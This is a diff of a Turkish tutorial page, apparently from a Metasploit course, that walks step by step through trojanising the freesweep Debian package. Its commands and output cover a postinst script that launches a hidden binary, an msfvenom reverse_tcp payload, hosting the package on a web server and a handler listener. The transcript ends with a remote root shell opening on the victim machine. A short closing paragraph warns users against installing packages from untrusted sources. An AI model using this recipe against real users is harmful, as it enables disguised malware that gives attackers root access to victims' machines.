@@ -39,7 +39,7 @@ url: /tr/msf-binary-linux-trojan/
  
 
  
-<h2 class="wp-block-heading" id="paketi-indirelim">Paketi indirelim</h2>
+<h2 class="wp-block-heading" id="paketi-indirelim">Paketi indirelim
 <!-- /wp:heading -->
 
   Paketi&nbsp;<code>--download-only</code>&nbsp;parametresiyle indirdiğimizde, işletim sistemimize kurulmayacaktır. Daha sonra indirdiğimiz paketi üzerinde çalışmak üzere oluşturacağımız&nbsp;<code>/tmp/evil</code>&nbsp;klasörüne taşıyacağız. 
@@ -62,7 +62,7 @@ root@kali:/tmp/evil#
  
 
  
-<h2 class="wp-block-heading" id="paketi-açalım">Paketi Açalım</h2>
+<h2 class="wp-block-heading" id="paketi-açalım">Paketi Açalım
 <!-- /wp:heading -->
 
   Şimdi bu&nbsp;<code>.deb</code>&nbsp;uzantılı paketi, sıkıştırılmış bir dosyayı açmaya benzer şekilde açmamız gerekiyor. Bu paketi aşağıdaki komutla&nbsp;<code>/tmp/evil</code>&nbsp;klasörü içinde&nbsp;<code>work</code>&nbsp;klasörüne çıkartıyoruz. Ardından, bizim ilave edeceğimiz özelliklerin bulunacağı&nbsp;<code>DEBIAN</code>&nbsp;isimli bir klasörü&nbsp;<code>/tmp/evil/work</code>&nbsp;klasörü altına oluşturuyoruz. 
@@ -75,13 +75,13 @@ root@kali:/tmp/evil# mkdir work/DEBIAN
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="control-dosyası-oluşturalım">control Dosyası oluşturalım</h2>
+<h2 class="wp-block-heading" id="control-dosyası-oluşturalım">control Dosyası oluşturalım
 <!-- /wp:heading -->
 
   Debian klasörünün içerisinde&nbsp;<code>control</code>&nbsp;isimli bir dosya oluşturup içerisine aşağıdaki Metni yapıştırıp kaydediyoruz. Dosya içeriği aşağıdaki gibi&nbsp;<code>cat control</code>&nbsp;komutuyla kontrol ediyoruz. 
  
 
-  <strong>control</strong>&nbsp;dosyası içeriği 
+  ***control*** &nbsp;dosyası içeriği 
  
 
 <!-- wp:code -->
@@ -90,45 +90,45 @@ Version: 0.90-1
 Section: Games and Amusement
 Priority: optional
 Architecture: i386
-Maintainer: Ubuntu MOTU Developers <strong>(</strong>ubuntu-motu@lists.ubuntu.com<strong>)</strong>
+Maintainer: Ubuntu MOTU Developers ***(*** ubuntu-motu@lists.ubuntu.com***)*** 
 Description: a text-based minesweeper
  Freesweep is an implementation of the popular minesweeper game, where
  one tries to find all the mines without igniting any, based on hints given
  by the computer. Unlike most implementations of this game, Freesweep
- works <strong>in </strong>any visual text display - <strong>in </strong>Linux console, <strong>in </strong>an xterm, and <strong>in
- </strong>most text-based terminals currently <strong>in </strong>use.
+ works ***in *** any visual text display - ***in *** Linux console, ***in *** an xterm, and ***in
+ *** most text-based terminals currently ***in *** use.
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="postinst-dosyası-oluşturalım">postinst dosyası oluşturalım</h2>
+<h2 class="wp-block-heading" id="postinst-dosyası-oluşturalım">postinst dosyası oluşturalım
 <!-- /wp:heading -->
 
   Kurulum sonrası çalışması için ayrıca bir bash script dosyasına daha ihtiyacımız var. Yine yukarıdaki gibi&nbsp;<code>DEBIAN</code>&nbsp;klasörü içine&nbsp;<code>postinst</code>&nbsp;isimli bir dosya oluşturuyoruz. İçerisine aşağıdaki kod satırlarını yapıştırıyoruz. 
  
 
-  <strong>postinst</strong>&nbsp;dosya içeriği 
+  ***postinst*** &nbsp;dosya içeriği 
  
 
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash"><em>#!/bin/sh</em>
 
-sudo chmod 2755 /usr/games/freesweep_scores <strong>&amp;&amp;</strong> /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;
+sudo chmod 2755 /usr/games/freesweep_scores ***&amp;&amp;***  /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="payload-oluşturalım">Payload Oluşturalım</h2>
+<h2 class="wp-block-heading" id="payload-oluşturalım">Payload Oluşturalım
 <!-- /wp:heading -->
 
   Şimdi içerisinde zararlı kodların olduğu dosyayı oluşturabiliriz. Bunun için aşağıdaki komutu kullanarak&nbsp;<code>linux/x86/shell/reverse_tcp</code>&nbsp;payload modülünü kullanacağız. Komut içerisinde&nbsp;<code>LHOST</code>&nbsp;ve&nbsp;<code>LPORT</code>&nbsp;olarak verdiğimiz değişkenleri kendiniz belirleyebilirsiniz. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST<strong>=</strong>192.168.1.101 LPORT<strong>=</strong>443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
+<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST***=*** 192.168.1.101 LPORT***=*** 443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 98 <strong>(</strong>iteration<strong>=</strong>0<strong>)</strong>
+x86/shikata_ga_nai succeeded with size 98 ***(*** iteration***=*** 0***)*** 
 x86/shikata_ga_nai chosen with final size 98
 Payload size: 98 bytes
 Saved as: /tmp/evil/work/usr/games/freesweep_scores
@@ -136,7 +136,7 @@ Saved as: /tmp/evil/work/usr/games/freesweep_scores
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="yeniden-paketleme">Yeniden paketleme</h2>
+<h2 class="wp-block-heading" id="yeniden-paketleme">Yeniden paketleme
 <!-- /wp:heading -->
 
   Artık,&nbsp;<code>postinst</code>&nbsp;dosyamızı çalıştırılabilir hale getirip&nbsp;<code>.deb</code>&nbsp;paketini derleyebiliriz. Komut sonucunda oluşturulacak&nbsp;<code>work.deb</code>&nbsp;paketinin ismini&nbsp;<code>freesweep.deb</code>&nbsp;olarak değiştirip Apache Server klasörüne (<code>/var/www</code>&nbsp;veya&nbsp;<code>/var/www/html</code>) yükleyebiliriz. Artık dosyamız Web sunucuda indirilebilir durumdadır. 
@@ -152,7 +152,7 @@ root@kali:/tmp/evil# cp freesweep.deb /var/www/
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="dinleyici-handler-oluşturma">Dinleyici Handler Oluşturma</h2>
+<h2 class="wp-block-heading" id="dinleyici-handler-oluşturma">Dinleyici Handler Oluşturma
 <!-- /wp:heading -->
 
   Şimdi, bir tıklama veya çalıştırma ile gelecek bağlantı isteklerini dinlemek için dinleyici oluşturalım. Burada komuta vereceğimiz&nbsp;<code>LHOST</code>&nbsp;ve&nbsp;<code>LPORT</code>&nbsp;değerleri, payload oluştururken girilen değerler ile aynı olmalıdır. 
@@ -160,16 +160,16 @@ root@kali:/tmp/evil# cp freesweep.deb /var/www/
 
 <!-- wp:code -->
 <pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
-PAYLOAD <strong>=&gt;</strong> linux/x86/shell/reverse_tcp
-LHOST <strong>=&gt;</strong> 192.168.1.101
-LPORT <strong>=&gt;</strong> 443
-<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler on 192.168.1.101:443
-<strong>[</strong><strong>*</strong><strong>]</strong> Starting the payload handler...
+PAYLOAD ***=&gt;***  linux/x86/shell/reverse_tcp
+LHOST ***=&gt;***  192.168.1.101
+LPORT ***=&gt;***  443
+***[*** ******* ***]***  Started reverse handler on 192.168.1.101:443
+***[*** ******* ***]***  Starting the payload handler...
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="sonuç">Sonuç</h2>
+<h2 class="wp-block-heading" id="sonuç">Sonuç
 <!-- /wp:heading -->
 
   Herhangi bir kullanıcı, bu hazırladığımız&nbsp;<code>freesweep.deb</code>&nbsp;paketini indirip çalıştırdığında dinleme yapan&nbsp;<code>exploit/multi/handler</code>&nbsp;modülümüz hedef bilgisayarda oturum açacaktır. 
@@ -179,8 +179,8 @@ LPORT <strong>=&gt;</strong> 443
 <pre class="wp-block-code"><code lang="bash" class="language-bash">ubuntu@ubuntu:~$ wget <a href="http://192.168.1.101/freesweep.deb">http://192.168.1.101/freesweep.deb</a>
 ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>36 bytes<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Command shell session 1 opened <strong>(</strong>192.168.1.101:443 -&gt; 192.168.1.175:1129<strong>)</strong>
+***[*** ******* ***]***  Sending stage ***(*** 36 bytes***)*** 
+***[*** ******* ***]***  Command shell session 1 opened ***(*** 192.168.1.101:443 -&gt; 192.168.1.175:1129***)*** 
 
 ifconfig
 eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6
@@ -189,19 +189,19 @@ UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
 RX packets:49 errors:0 dropped:0 overruns:0 frame:0
 TX packets:51 errors:0 dropped:0 overruns:0 carrier:0
 collisions:0 txqueuelen:1000
-RX bytes:43230 <strong>(</strong>42.2 KiB<strong>)</strong> TX bytes:4603 <strong>(</strong>4.4 KiB<strong>)</strong>
+RX bytes:43230 ***(*** 42.2 KiB***)***  TX bytes:4603 ***(*** 4.4 KiB***)*** 
 Interrupt:17 Base address:0x1400
 ...snip...
 
 hostname
 ubuntu
 id
-uid<strong>=</strong>0<strong>(</strong>root<strong>)</strong> gid<strong>=</strong>0<strong>(</strong>root<strong>)</strong> groups<strong>=</strong>0<strong>(</strong>root<strong>)</strong>
+uid***=*** 0***(*** root***)***  gid***=*** 0***(*** root***)***  groups***=*** 0***(*** root***)*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="tavsiye">Tavsiye</h2>
+<h2 class="wp-block-heading" id="tavsiye">Tavsiye
 <!-- /wp:heading -->
 
   Görüldüğü gibi zararlı yazılımlar sadece Windows’a özel değildir. Linux kullanıcılarının da tıkla ve çalıştır programlara dikkatle yaklaşması gerekmektedir. Güvenilir olmayan kaynaklardan paket yüklememenizi tavsiye ediyoruz. 
